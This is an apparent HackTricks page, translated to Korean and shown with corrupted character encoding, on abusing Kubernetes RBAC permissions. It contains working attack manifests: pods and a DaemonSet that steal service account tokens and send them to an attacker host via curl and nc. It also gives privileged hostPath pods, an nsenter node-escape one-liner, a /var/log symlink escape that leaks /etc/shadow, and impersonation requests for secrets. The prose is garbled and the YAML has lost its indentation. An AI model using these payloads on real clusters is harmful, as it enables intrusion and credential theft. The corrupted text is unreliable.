# Kubernetesì—ì„œ Roles/ClusterRoles ë‚¨ìš©í•˜ê¸°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ì„** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

ì—¬ê¸°ì—ì„œëŠ” ëª‡ ê°€ì§€ ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ Roles ë° ClusterRoles êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
`kubectl api-resources`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  ì§€ì›ë˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## **ê¶Œí•œ ìƒìŠ¹**

Kubernetesì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **4ê°€ì§€ ì£¼ìš” ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œë¡œì˜ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ì´ë¯¸ ê°€ì§€ê³  ìˆëŠ” ìƒíƒœì—ì„œ **ë‹¤ë¥¸ ì£¼ì²´ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤**ì™€ **ë‹¤ë¥¸ ê¶Œí•œ**ì„ ì–»ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:

* Kubernetes í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œë¡œ **ë‹¤ë¥¸ ì‚¬ìš©ì/ê·¸ë£¹/ì„œë¹„ìŠ¤ ê³„ì •(SA)ë¥¼ ê°€ì¥í•œ** ê¶Œí•œ ìƒìŠ¹
* Kubernetes í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œë¡œ **íŒŒë“œë¥¼ ìƒì„±/íŒ¨ì¹˜/ì‹¤í–‰**í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ íŒŒë“œ ë‚´ì—ì„œ ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ SAsë¥¼ **ì°¾ê±°ë‚˜ ì—°ê²°**í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ ìƒìŠ¹
* SAs í† í°ì´ ë¹„ë°€ë¡œ ì €ì¥ë˜ë¯€ë¡œ **ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆëŠ” ê¶Œí•œ** ìƒìŠ¹
* ì»¨í…Œì´ë„ˆì—ì„œ ë…¸ë“œë¡œ **ì´íƒˆ**í•  ìˆ˜ ìˆëŠ” ê²½ìš°, í•´ë‹¹ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì˜ ëª¨ë“  ë¹„ë°€, ë…¸ë“œì˜ ìê²©ì¦ëª… ë° í´ë¼ìš°ë“œ ë‚´ì—ì„œ ë…¸ë“œì˜ ê¶Œí•œì„ ë„ìš©í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ ìƒìŠ¹ (ìˆëŠ” ê²½ìš°)
* í¬ë“œì—ì„œ **í¬íŠ¸ í¬ì›Œë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆëŠ” ê²½ìš°, í•´ë‹¹ í¬ë“œ ë‚´ì—ì„œ í¥ë¯¸ë¡œìš´ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ê²½ìš°ê°€ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ëª¨ë“  ë¦¬ì†ŒìŠ¤ ë˜ëŠ” ë™ì‚¬ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ (ì™€ì¼ë“œì¹´ë“œ)

**ì™€ì¼ë“œì¹´ë“œ (*)ëŠ” ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ëª¨ë“  ë™ì‚¬ ê¶Œí•œì„ ë¶€ì—¬**í•©ë‹ˆë‹¤. ì´ëŠ” ê´€ë¦¬ìì— ì˜í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ClusterRole ë‚´ì—ì„œ ì´ëŠ” ê³µê²©ìê°€ í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë‚¨ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### íŠ¹ì • ë™ì‚¬ë¡œ ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ê¸°

RBACì—ì„œëŠ” íŠ¹ì • ê¶Œí•œì´ ì¤‘ëŒ€í•œ ìœ„í—˜ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤:

1. **`create`:** ì–´ë–¤ í´ëŸ¬ìŠ¤í„° ë¦¬ì†ŒìŠ¤ë“  ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í˜‘í•©ë‹ˆë‹¤.
2. **`list`:** ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë¯¼ê°í•œ ë°ì´í„°ê°€ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. **`get`:** ì„œë¹„ìŠ¤ ê³„ì •ì—ì„œ ë¹„ë°€ ì •ë³´ì— ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë³´ì•ˆ ìœ„í˜‘ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod ìƒì„± - í† í° ë„ìš©

Podë¥¼ ìƒì„±í•  ê¶Œí•œì´ ìˆëŠ” ê³µê²©ìëŠ” íŠ¹ê¶Œì´ ë¶€ì—¬ëœ ì„œë¹„ìŠ¤ ê³„ì •ì„ Podì— ì—°ê²°í•˜ì—¬ í† í°ì„ ë„ìš©í•˜ê³ , ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`bootstrap-signer` ì„œë¹„ìŠ¤ ê³„ì •ì˜ í† í°ì„ ë„ìš©í•˜ê³  ê³µê²©ìì—ê²Œ ì „ì†¡í•˜ëŠ” Podì˜ ì˜ˆì‹œ:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-stealer
spec:
  serviceAccountName: bootstrap-signer
  containers:
  - name: token-stealer
    image: busybox
    command: ["/bin/sh", "-c"]
    args:
    - while true; do
        curl -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" http://attacker-ip:8000;
        sleep 10;
      done
```

ì´ ì˜ˆì‹œì—ì„œëŠ” `busybox` ì´ë¯¸ì§€ë¥¼ ì‚¬ìš©í•˜ì—¬ Podë¥¼ ìƒì„±í•˜ê³ , `bootstrap-signer` ì„œë¹„ìŠ¤ ê³„ì •ì˜ í† í°ì„ ë„ìš©í•˜ì—¬ ê³µê²©ìì˜ IP ì£¼ì†Œë¡œ ì „ì†¡í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ë„ìš©í•œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod ìƒì„± ë° íƒˆì¶œ

ë‹¤ìŒì€ ì»¨í…Œì´ë„ˆê°€ ê°€ì§ˆ ìˆ˜ ìˆëŠ” ëª¨ë“  ê¶Œí•œì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:

* **íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤** (ë³´í˜¸ ê¸°ëŠ¥ ë¹„í™œì„±í™” ë° ê¸°ëŠ¥ ì„¤ì •)
* **hostIPC ë° hostPid ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¹„í™œì„±í™”**ëŠ” ê¶Œí•œ ìƒìŠ¹ì— ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **hostNetwork ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¹„í™œì„±í™”**ëŠ” ë…¸ë“œì˜ í´ë¼ìš°ë“œ ê¶Œí•œì„ íƒˆì·¨í•˜ê³  ë„¤íŠ¸ì›Œí¬ì— ë” ë‚˜ì€ ì•¡ì„¸ìŠ¤ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
* **ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì— í˜¸ìŠ¤íŠ¸ì˜ / ë§ˆìš´íŠ¸**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ë‹¤ìŒê³¼ ê°™ì´ podë¥¼ ìƒì„±í•˜ì„¸ìš”:
```bash
kubectl --token $token create -f mount_root.yaml
```
[ì´ íŠ¸ìœ—](https://twitter.com/mauilion/status/1129468485480751104)ì—ì„œ ê°€ì ¸ì˜¨ ì›ë¼ì´ë„ˆì™€ ì¶”ê°€ ë‚´ìš©: 

```plaintext
Kubernetes RBAC is hard. ClusterRoles are powerful. ClusterRoleBindings are dangerous. ServiceAccounts are risky. Always review and audit your permissions. #Kubernetes #RBAC #Security
```

Kubernetes RBACëŠ” ì–´ë µìŠµë‹ˆë‹¤. ClusterRolesëŠ” ê°•ë ¥í•©ë‹ˆë‹¤. ClusterRoleBindingsëŠ” ìœ„í—˜í•©ë‹ˆë‹¤. ServiceAccountsëŠ” ìœ„í—˜í•©ë‹ˆë‹¤. ê¶Œí•œì„ í•­ìƒ ê²€í† í•˜ê³  ê°ì‚¬í•˜ì„¸ìš”. #Kubernetes #RBAC #ë³´ì•ˆ
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
ì´ì œ ë…¸ë“œë¡œ ì´ë™í•˜ì—¬ í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡ ê¸°ë²•ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

#### ì€ì‹ 

ì•„ë§ˆë„ ë” **ì€ì‹ **í•˜ê³  ì‹¶ì„ ê²ƒì…ë‹ˆë‹¤. ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ì „ í…œí”Œë¦¿ì—ì„œ ì–¸ê¸‰í•œ íŠ¹ê¶Œ ì¤‘ ì¼ë¶€ë§Œ í™œì„±í™”í•˜ì—¬ íŒŸì„ ìƒì„±í•  ê²½ìš° ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **íŠ¹ê¶Œ + hostPID**
* **íŠ¹ê¶Œë§Œ**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_ì´ì „ íŠ¹ê¶Œ ìˆëŠ” íŒŸ êµ¬ì„±ì„ ìƒì„±/ë‚¨ìš©í•˜ëŠ” ì˜ˆì œëŠ”_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤._

### í¬ë“œ ìƒì„± - í´ë¼ìš°ë“œë¡œ ì´ë™

**íŒŸ** (ê·¸ë¦¬ê³  ì„ íƒì ìœ¼ë¡œ **ì„œë¹„ìŠ¤ ê³„ì •**)ì„ **ìƒì„±**í•  ìˆ˜ ìˆë‹¤ë©´, **íŒŸì´ë‚˜ ì„œë¹„ìŠ¤ ê³„ì •ì— í´ë¼ìš°ë“œ ì—­í• ì„ í• ë‹¹**í•œ ë‹¤ìŒ ì•¡ì„¸ìŠ¤í•˜ì—¬ **í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ íŠ¹ê¶Œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ë˜í•œ, **í˜¸ìŠ¤íŠ¸ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê°€ì§„ íŒŸì„ ìƒì„±**í•  ìˆ˜ ìˆë‹¤ë©´, **ë…¸ë“œ** ì¸ìŠ¤í„´ìŠ¤ì˜ IAM ì—­í• ì„ **íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **ë°°í¬, ë°ëª¬ì…‹, ìƒíƒœí’€ì…‹, ë³µì œì»¨íŠ¸ë¡¤ëŸ¬, ë ˆí”Œë¦¬ì¹´ì…‹, ì‘ì—… ë° í¬ë¡ ì¡ ìƒì„±/íŒ¨ì¹˜**

ì´ëŸ¬í•œ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ì´ì „ ì˜ˆì œì™€ ê°™ì´ **ìƒˆë¡œìš´ íŒŸì„ ìƒì„±**í•˜ê³  íŠ¹ê¶Œì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ YAMLì€ ë°ëª¬ì…‹ì„ ìƒì„±í•˜ê³  íŒŸ ë‚´ë¶€ì—ì„œ SAì˜ í† í°ì„ ìœ ì¶œí•©ë‹ˆë‹¤:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**ì€ **íŒŒë“œ ë‚´ë¶€ì—ì„œ ì‰˜ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì¿ ë²„ë„¤í‹°ìŠ¤ ë¦¬ì†ŒìŠ¤**ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì‰˜ì— ì ‘ì†**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ, **íŒŒë“œ ë‚´ë¶€ë¡œ ì§„ì…í•˜ì—¬ SAì˜ í† í°ì„ íƒˆì·¨í•˜ê±°ë‚˜ íŠ¹ê¶Œì´ ìˆëŠ” íŒŒë“œì— ì§„ì…í•˜ì—¬ ë…¸ë“œë¡œ ì´íƒˆí•˜ê³  ë…¸ë“œ ë‚´ì˜ ëª¨ë“  íŒŒë“œ í† í°ì„ íƒˆì·¨í•˜ê³  (ë‚¨ìš©í•˜ì—¬) ë…¸ë“œë¥¼ ì•…ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### í¬íŠ¸ í¬ì›Œë“œ

ì´ ê¶Œí•œì€ **ë¡œì»¬ í¬íŠ¸ë¥¼ ì§€ì •ëœ íŒŸì˜ í¬íŠ¸ë¡œ ì „ë‹¬**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŠ” íŒŸ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‰½ê²Œ ë””ë²„ê¹…í•˜ê¸° ìœ„í•œ ê²ƒì´ì§€ë§Œ, ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ íŒŸ ë‚´ì˜ í¥ë¯¸ë¡œìš´ (ì˜ˆ: DB) ë˜ëŠ” ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ (ì›¹?)ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
kubectl port-forward pod/mypod 5000:5000
```
### í˜¸ìŠ¤íŠ¸ ì“°ê¸° ê°€ëŠ¥í•œ /var/log/ íƒˆì¶œ

[**ì´ ì—°êµ¬ì—ì„œ ë‚˜íƒ€ë‚¸ ê²ƒ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ê³¼ ê°™ì´, í˜¸ìŠ¤íŠ¸ì˜ `/var/log/` ë””ë ‰í† ë¦¬ê°€ ë§ˆìš´íŠ¸ëœ íŒŸì— ì ‘ê·¼í•˜ê±°ë‚˜ ìƒì„±í•  ìˆ˜ ìˆë‹¤ë©´, ì»¨í…Œì´ë„ˆì—ì„œ **íƒˆì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **Kube-APIê°€ ì»¨í…Œì´ë„ˆì˜ ë¡œê·¸ë¥¼ ê°€ì ¸ì˜¤ë ¤ê³  í•  ë•Œ** (`kubectl logs <pod>`ë¥¼ ì‚¬ìš©í•˜ì—¬), **Kubelet** ì„œë¹„ìŠ¤ì˜ `/logs/` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŸì˜ `0.log` íŒŒì¼ì„ ìš”ì²­í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
Kubelet ì„œë¹„ìŠ¤ëŠ” ì»¨í…Œì´ë„ˆì˜ `/var/log` íŒŒì¼ ì‹œìŠ¤í…œì„ ë…¸ì¶œí•˜ëŠ” ê²ƒì— ë¶ˆê³¼í•œ `/logs/` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤.

ë”°ë¼ì„œ, ì»¨í…Œì´ë„ˆì˜ **/var/log/ í´ë”ì— ì“°ê¸° ê¶Œí•œì´ ìˆëŠ” ê³µê²©ìëŠ” ë‹¤ìŒ 2ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì´ëŸ¬í•œ ë™ì‘ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì»¨í…Œì´ë„ˆì˜ `0.log` íŒŒì¼ì„ ìˆ˜ì •í•˜ì—¬ (`/var/logs/pods/namespace_pod_uid/container/0.log`ì— ì¼ë°˜ì ìœ¼ë¡œ ìœ„ì¹˜í•¨) `/etc/shadow`ë¥¼ ê°€ë¦¬í‚¤ëŠ” **ì‹¬ë³¼ë¦­ ë§í¬**ë¡œ ë§Œë“­ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, í˜¸ìŠ¤íŠ¸ì˜ shadow íŒŒì¼ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* ë§Œì•½ ê³µê²©ìê°€ `nodes/log`ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ë¥¼ ì œì–´í•œë‹¤ë©´, ê·¸ëŠ” `/host-mounted/var/log/sym`ì— `/`ë¡œì˜ **ì‹¬ë³¼ë¦­ ë§í¬**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  `https://<gateway>:10250/logs/sym/`ì— ì ‘ê·¼í•  ë•Œ, ê·¸ëŠ” í˜¸ìŠ¤íŠ¸ì˜ ë£¨íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ë³€ê²½í•˜ë©´ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**ì—ì„œ **ì‹¤í—˜ì‹¤ ë° ìë™í™”ëœ ì•…ìš©**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### readOnly ë³´í˜¸ ìš°íšŒí•˜ê¸° <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ìš´ì´ ì¢‹ë‹¤ë©´, ê³ ë„ë¡œ ê¶Œí•œì´ ìˆëŠ” `CAP_SYS_ADMIN` ê¸°ëŠ¥ì´ ì‚¬ìš© ê°€ëŠ¥í•œ ê²½ìš°, í´ë”ë¥¼ ì½ê¸°/ì“°ê¸°ë¡œ ë‹¤ì‹œ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath ì½ê¸° ì „ìš© ë³´í˜¸ ìš°íšŒí•˜ê¸° <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**ì´ ì—°êµ¬**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ì—ì„œ ì–¸ê¸‰í•œ ëŒ€ë¡œ ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
ë‹¤ë¥¸ ì´ì „ ë°©ë²•ë“¤ê³¼ ê°™ì€ íƒˆì¶œì„ ë°©ì§€í•˜ê¸° ìœ„í•´, hostPath ë§ˆìš´íŠ¸ ëŒ€ì‹ ì— PersistentVolumeê³¼ PersistentVolumeClaimì„ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ í´ë”ë¥¼ ì»¨í…Œì´ë„ˆì— ì“°ê¸° ê°€ëŠ¥í•œ ê¶Œí•œìœ¼ë¡œ ë§ˆìš´íŠ¸í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **íŠ¹ê¶Œ ê³„ì • ìœ„ì¥**

[**ì‚¬ìš©ì ìœ„ì¥**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ê¶Œí•œì„ ì‚¬ìš©í•˜ì—¬ ê³µê²©ìëŠ” íŠ¹ê¶Œ ê³„ì •ìœ¼ë¡œ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`kubectl` ëª…ë ¹ì–´ì—ì„œ `--as=<ì‚¬ìš©ìëª…>` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¡œ ìœ„ì¥í•˜ê±°ë‚˜, `--as-group=<ê·¸ë£¹>`ì„ ì‚¬ìš©í•˜ì—¬ ê·¸ë£¹ìœ¼ë¡œ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
ë˜ëŠ” REST APIë¥¼ ì‚¬ìš©í•˜ì„¸ìš”:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ë¹„ë°€ ëª©ë¡

